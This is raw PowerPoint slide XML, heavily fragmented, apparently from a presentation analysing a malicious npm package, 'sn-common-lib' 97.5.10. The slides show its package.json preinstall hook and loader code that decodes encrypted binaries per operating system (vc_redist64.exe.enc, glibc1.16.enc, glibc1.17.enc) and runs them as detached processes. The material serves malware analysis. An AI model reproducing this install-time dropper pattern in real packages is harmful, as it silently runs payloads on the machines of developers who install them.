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3"/>
    <p:restoredTop sz="94694"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="135" d="100"/>
          <a:sy n="135" d="100"/>
        </p:scale>
        <p:origin x="14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0A27C-FE9B-654D-85A4-98F92A04DAB2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EC31D-4B10-7D49-BF54-2E2C371A60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4583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EC31D-4B10-7D49-BF54-2E2C371A60E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703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85A8F-6036-499E-66E0-D48E53FEF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FA3FB7-42C4-61DA-FD3F-7E72779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F7CFB-60EB-7716-D565-94445F1D2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A2C17-348C-214E-7939-8818126D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671D81-B51D-BAC5-ED40-6F3EC557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79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B230B-BFE9-8E62-903F-3E74A415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EE4A3D-C392-4868-C286-34D626178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2BF7B-B180-9736-4998-B0264FA1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CB4E6C-F3FC-6FE4-5CE3-332F4655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F9464A-4F93-49D0-A1AC-7ADEABF0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368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0961C-D35F-0D9F-7335-3117CEB3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E74DF1-4514-FFB3-9B8F-6549D3A7E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A22E86-2F32-84DC-D148-88D9BF06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98E28-F491-E077-F853-AC001488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A8EFA-958C-F8A9-91CF-1C0F736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709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BE5F2-20FA-6E76-9CBA-47F9F237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E9432E-47D0-1F7A-A21B-A0BCB6C01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DC22D6-7F59-672D-681C-A44DD2638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DD431C-8FD7-79D7-3F2F-BCF1256E7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83D8D5-1B56-5E4D-7855-A3C5467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28099F-02E4-389B-0C81-B794D407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888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E4019-C830-859B-1636-20DED5739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7E5502-1975-B446-C8AE-5C6F9955E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787B97-9801-2E39-53D4-454793FAD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19AAC8-E342-29BC-46AD-20C6C26C7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8A2C8B-6113-C668-AFF4-B9EE18A16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87EF65-D8D7-FB6A-9ED3-67D1BD17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3309D8-0DDE-88F4-80BD-179A0F5C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98EFC0-324C-2225-8FFE-4A32F7E3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12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E8D53-A398-2CE6-79C2-F8F1C83A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FC76EB-7F8B-AE2A-9095-EC3D99F4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251E04-31F1-3673-D7FC-98D5FB06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AF7CAE-EE03-8482-6F52-C264CED1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204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FF9DF2-7982-683A-D080-66096FA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41BA92-E931-36A7-FEA9-B555FD85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FEA54-9600-86CA-0721-54992FFD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72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B29E4-EF9B-73F8-3FBD-694A3DDF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14FEF3-1592-B4E5-FA26-999C054F9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5E987E-4F0C-3D4A-39DF-42B571D62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2E71E6-3CE6-6881-BA45-1B26E4268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47FE51-F0B3-9F49-B2DA-08D23D27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5B2A09-3E7C-FEED-13C3-B8DE2DC9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81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560A15-C2EA-2866-D935-B182C1534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2859E9-BD9D-FD9A-F399-0D53D5D6C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3E2F26-86C4-5D23-52F7-EF23965A1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6B0465-5450-F084-A952-CDDEEC69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CFC89F-DF6F-932E-44AC-5D4E0978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DB96FF-ACD1-EB63-B1CE-65388C7A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741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8C5C0-C50A-8F3B-7A06-D0C39A32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DA814B-5C2D-4224-804C-55905D846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6ED36-7FD7-95F2-F998-EBD021AC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C7E325-513A-768D-96AE-7870E318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D9977E-A455-F4A0-1F2A-AEDD8EA0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166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736346-A171-7660-DFBF-2C9C80F718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220543-B313-C98A-9CBF-302FDE1E4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3BCAC8-8862-6BF2-23E3-B2F6C875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650DD-0485-DBC8-799D-25C3E64D3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805303-9FED-D42F-FB89-8AF726C01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289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923DC9-AB6E-7C26-B283-D70BFD8B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753F39-A253-04E9-971F-8D5B9D48E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465AA-3F22-CE30-7F3D-4234330DD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1621F-2555-893A-9F0C-7B3FC9B97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658B6B-7891-B73C-3053-D47136611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2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69FF54-CA49-021C-1417-809AA89C2A66}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1147083" y="3086306"/>
            <a:ext cx="5625279" cy="34163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'win32'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decodePackage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".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\\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vc_redist64.exe.enc"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child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spawn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[], { </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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stdio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'ignore'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detached: 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linux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decodePackage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"./glibc1.16.enc"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makeFileExecutable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spawnDetachedProcess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darwin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decodePackage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"./glibc1.17.enc"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makeFileExecutable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spawnDetachedProcess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" altLang="zh-CN" sz="1200" b="0" i="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B31D28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" altLang="zh-CN" sz="1200" i="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B31D2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8658BF-E92A-1A8A-2BEB-18CBFCFC48F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="841086" y="3086306"/>
            <a:ext cx="5931277" cy="3046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0C2B68-CF34-A67D-3907-E48A3F1C4F63}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="841088" y="3099826"/>
            <a:ext cx="37061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7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8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9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10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16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C11FE7-2DEE-8A7E-D86C-D3095F04034C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1147084" y="699613"/>
            <a:ext cx="5625279" cy="230832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" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005CC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"name"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sn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-common-lib"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"version"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"97.5.10"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" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005CC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"scripts"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</a:p>
          <a:p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"test"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”..."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" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1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preinstall"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"node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./package_preinstall.97.5.10.js"</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292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},</a:t>
            </a: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" altLang="zh-CN" sz="1200" b="0" i="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B31D28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" altLang="zh-CN" sz="1200" i="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B31D2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062664D8-055E-0B11-51D4-1D574F2D11CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="841086" y="699613"/>
            <a:ext cx="5931277" cy="1952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AD7BB238-4686-8D47-4F86-22581DBCF926}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="841088" y="713133"/>
            <a:ext cx="3706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7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8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9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B7B011-B1E0-C309-577B-368999675601}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="841086" y="2730494"/>
            <a:ext cx="5931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sn-common-lib-97.5.10/package/package_preinstall.97.5.10.js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92A5A1-CEF3-F3C0-C1F6-0977EC575F71}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="841085" y="355374"/>
            <a:ext cx="5931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sn-common-lib-97.5.10/package/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en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package.json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52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188</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>宽屏</PresentationFormat>
  <Paragraphs>55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</vt:lpstr>
      <vt:lpstr>Courier</vt:lpstr>
      <vt:lpstr>Courier New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峻安 张</dc:creator>
  <cp:lastModifiedBy>Junan Zhang</cp:lastModifiedBy>
  <cp:revision>45</cp:revision>
  <cp:lastPrinted>2023-04-10T03:38:56Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2023-04-10T02:45:49Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-04-25T10:13:56Z</dcterms:modified>
</cp:coreProperties>
</file>